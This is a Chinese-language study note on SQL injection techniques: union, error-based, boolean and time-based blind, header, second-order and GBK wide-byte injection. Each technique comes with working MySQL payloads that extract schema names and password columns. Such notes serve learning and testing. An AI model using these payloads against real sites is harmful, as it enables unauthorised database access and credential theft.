# SQL注入

## SQL注入类型

### `UNION`联合注入

- `GET` / `POST`判断：传参位置
- 找出正确的闭合、绕过方式
- `order by`查询字段数
- `union select`查询显示位，显示位可插入查询语句（有回显）
- 爆库爆表爆字段

```sql
union select 1,user(),database()；
union select 1,2,group_concat(table_name) from information_schema.tables where table_schema= "databaseName";
union select 1,2,group_concat(column_name) from information_schema.columns where table_name="tableName";
union select 1,id,passwd from "columnName";
```

<br>

### 基于报错注入

- 有报错信息（ 有回显 ）

- 调用函数传入错误函数引起报错，查看报错信息中的信息

```sql
-- updatexml()
and updatexml(1,concat(0x7e,(select database()),0x7e),1)

-- floor()
and (select 1 from (select count(*),concat((database()),floor (rand(0)*2))x from information_schema.tables group by x)a)

-- extractvalue()
and (extractvalue(1,concat(0x7e,(select user()),0x7e)));
```

<br>

### 布尔盲注

- 无回显，只有`对` / `错`两种状态

- 用`length()`和`substr()`语句，用两种状态来解出库名、表名等的长度和正确字母

```sql
and length(database())>2		-- 解出库名长度
and substr(database(),1,1)='a'  -- 字符 1
and substr(database(),2,1)='a'  -- 字符 2
```

- 重复上述步骤获得所需信息

<br>

### 时间盲注

- 无回显，无明确状态
- 使用`sleep(5)`延时返回`5s`，配合`if`语句使用

```shell
if (length(database())>1,sleep(5),1)
if(substr(database(),1,1)='s',sleep(5),1)
```

- 重复上述步骤

<br>

### HTTP header注入

- 抓包时顺便看看请求头，尝试注入
- 别的就跟前面的一样

```http
【Referer】
*【X-Forwarded-For】
*【Cookie】
【X-Real-IP】
【Accept-Language】
【Authorization】
```

<br>

### 二次注入

- `url-1`有注入点（参数），但返回信息不在`url-1`中显示，而是在另外一个`url-2`中显示

<br>

### 宽字节注入

- 单双引号均被转义，无法逃逸语句的单引号，且数据库是`GBK`编码（可尝试）
- 宽字节的格式是在地址后先加一个`%df`，再加单引号，因为反斜杠的编码为`%5c`，在`GBK`编码中，`%df%5c`是繁体字`“連”`，单引号成功逃逸。因此构造闭合规则时，在单引号前面加上`%df`就行了。

> :question: 什么是宽字节？`GBK`又是什么？
>
> - 宽字节是相对于ascII这样单字节而言的；像GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。
>
> - GBK是一种多字符的编码，通常来说，一个gbk编码汉字，占用2个字节。一个utf-8编码的汉字，占用3个字节。

<br>

### 获取`Webshell`

- 暂未涉及，以后补上
